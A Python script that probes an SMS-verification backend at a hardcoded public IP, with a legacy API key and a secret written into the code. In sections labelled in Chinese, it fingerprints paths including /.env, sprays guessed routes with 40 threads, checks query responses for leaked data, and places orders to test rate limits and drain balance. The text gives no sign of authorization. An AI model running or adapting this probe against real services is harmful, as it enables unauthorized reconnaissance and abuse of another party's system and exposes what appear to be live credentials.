#!/usr/bin/env python3
"""Deep probe focused on 8081 SMS backend."""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

SMS = "http://47.76.163.227:8081"
LEGACY = "18cdfb81a4e44a3a915528e67d923dba"
NEW_SECRET = "NLubjjBMACT6AYzW6WBNfkXF33h3yB"


def call(
    method: str,
    url: str,
    payload: dict | None = None,
    headers: dict | None = None,
    timeout: float = 10,
) -> tuple[int, dict[str, str], str]:
    data = None
    h = dict(headers or {})
    if payload is not None:
        data = json.dumps(payload).encode()
        h.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            hdrs = {k: v for k, v in resp.headers.items()}
            return resp.status, hdrs, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        hdrs = {k: v for k, v in e.headers.items()} if e.headers else {}
        return e.code, hdrs, e.read().decode("utf-8", "replace")


def section(title: str) -> None:
    print(f"\n{'='*60}\n{title}\n{'='*60}")


def main() -> int:
    section("1. 基础指纹")
    for path in ("/", "/swagger", "/health", "/api", "/.env"):
        code, hdrs, body = call("GET", SMS + path)
        print(f"GET {path:20} -> {code} server={hdrs.get('Server','')!r} body={body[:60]!r}")

    section("2. 四路由确认")
    for method, path, payload in [
        ("GET", f"/balance/{LEGACY}", None),
        ("POST", f"/create/{LEGACY}", {"area": "86", "data": "19900001111", "islink": False}),
        ("GET", f"/query/{LEGACY}/{'a'*32}", None),
        ("GET", f"/setsms/{LEGACY}/19900001111/1234", None),
    ]:
        code, _, body = call(method, SMS + path, payload)
        print(f"{method:7} {path[:50]:50} -> {code} {body[:100]}")

    section("3. 路由喷洒")
    words = """
    create query setsms balance order orders list history record logs admin api swagger
    cancel close delete batch export import config settings health version
    """.split()
    found: list[tuple[str, str, int, str]] = []
    seen: set[tuple[str, str, int]] = set()

    def probe(method: str, path: str) -> None:
        payload = {"area": "86", "data": "19900002222", "islink": False} if method == "POST" and "create" in path else None
        code, _, body = call(method, SMS + path, payload)
        key = (method, path, code)
        if code == 404 or key in seen:
            return
        seen.add(key)
        if code == 405 and not body.strip():
            return
        found.append((method, path, code, body[:140]))

    tasks: list[tuple[str, str]] = []
    for w in words:
        tasks.append(("GET", f"/{w}/{LEGACY}"))
        tasks.append(("POST", f"/{w}/{LEGACY}"))
    with ThreadPoolExecutor(max_workers=40) as pool:
        for fut in as_completed(pool.submit(probe, m, p) for m, p in tasks):
            fut.result()
    for row in sorted(found):
        print(f"{row[0]:7} {row[1]:45} -> {row[2]} {row[3]}")

    section("4. query 响应泄露")
    phone = f"1990000{int(time.time()) % 10000:04d}"
    _, _, create_body = call("POST", f"{SMS}/create/{LEGACY}", {"area": "86", "data": phone, "islink": False})
    oid = json.loads(create_body)["data"]
    for _ in range(10):
        _, _, q = call("GET", f"{SMS}/query/{LEGACY}/{oid}")
        if '"code":0' in q:
            print("query success data:", repr(q[:300]))
            break
        time.sleep(2)

    section("5. 限速 / 余额")
    _, _, b1 = call("GET", f"{SMS}/balance/{LEGACY}")
    t0 = time.time()
    for i in range(3):
        code, _, body = call("POST", f"{SMS}/create/{LEGACY}", {"area": "86", "data": f"1990000{7000+i}", "islink": False})
        print(f"create#{i+1}", code, body[:90])
    _, _, b2 = call("GET", f"{SMS}/balance/{LEGACY}")
    print(f"balance {b1.strip()} -> {b2.strip()} elapsed={time.time()-t0:.2f}s")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
